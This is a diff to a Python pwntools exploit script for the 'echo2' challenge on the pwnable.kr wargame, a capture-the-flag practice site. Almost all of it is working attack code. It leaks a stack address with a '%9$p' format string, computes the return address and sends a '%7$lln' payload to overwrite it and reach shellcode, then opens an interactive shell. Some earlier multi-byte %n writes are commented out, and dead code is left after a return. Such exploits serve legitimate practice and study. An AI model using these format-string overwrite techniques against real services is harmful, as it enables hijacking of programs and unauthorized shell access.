@@ -2,8 +2,8 @@ from pwn import *
 
 host = 'pwnable.kr'
 host = '0'
-#conn = connect(host, 9011)
-conn = process('./echo2')
+#conn = process('./echo2')
+conn = connect(host, 9011)
 
 nombre = 'physics'
 
@@ -26,13 +26,13 @@ def main():
 	# get ret addr on stack frame
 	conn.sendline('2')
 	conn.recvuntil(nombre)
-	conn.sendline('%p')
+	conn.sendline('%9$p')
 	conn.recvline()
 	line = conn.recvline()
 	leak = int(line[2:], 16)
 	print 'stack leak:' + hex(leak)
-	ret_addr = leak + 0xad99dba138
-	print 'ret addr:' + hex(ret_addr)
+	ret_addr = leak - 224
+	print 'main ret addr:' + hex(ret_addr)
 	print ''
 	conn.recvuntil('> ')
 
@@ -64,8 +64,6 @@ def main():
 	conn.recvuntil('> ')
 
 	# overwrite ret addr
-	conn.sendline('2')
-	conn.recvuntil(nombre)
 	sh_bytes = hex(shellcode_addr)[2:]
 	b1 = (1, int(sh_bytes[0:2], 16))
 	b2 = (2, int(sh_bytes[2:4], 16))
@@ -74,18 +72,28 @@ def main():
 	sh_bytes.sort(key=lambda x: x[1])
 
 	#pos:     6                   7                   8
-	payload = p64(ret_addr + 0) + p64(ret_addr + 1) + p64(ret_addr + 2)
+	#payload = p64(ret_addr + 0) + p64(ret_addr + 1) + p64(ret_addr + 2)
 
+	#num_print = sh_bytes[0][1]
+	#payload += '%{:d}x%{:d}$n'.format(num_print, sh_bytes[0][0] + 5)
+	#num_print = sh_bytes[1][1] - sh_bytes[0][1]
+	#payload += '%{:d}x%{:d}$n'.format(num_print, sh_bytes[1][0] + 5)
+	#num_print = sh_bytes[2][1] - sh_bytes[1][1]
+	#payload += '%{:d}x%{:d}$n'.format(num_print, sh_bytes[2][0] + 5)
+
+	conn.sendline('2')
+	conn.recvuntil(nombre)
+	payload = '%7$lln  '
+	payload += p64(ret_addr)
+	conn.sendline( payload ) # el payload no puede superar los 32 bytes...
+	conn.interactive()
+	return
 	num_print = sh_bytes[0][1]
 	payload += '%{:d}x%{:d}$n'.format(num_print, sh_bytes[0][0] + 5)
-	num_print = sh_bytes[1][1] - sh_bytes[0][1]
-	payload += '%{:d}x%{:d}$n'.format(num_print, sh_bytes[1][0] + 5)
-	num_print = sh_bytes[2][1] - sh_bytes[1][1]
-	payload += '%{:d}x%{:d}$n'.format(num_print, sh_bytes[2][0] + 5)
 
-	conn.sendline( payload )
+	payload += '%{:d}x%6$n'.format(100)#shellcode_addr)
+	assert len(payload) <= 32
 
-	conn.interactive()
 
 
 if __name__ == '__main__':
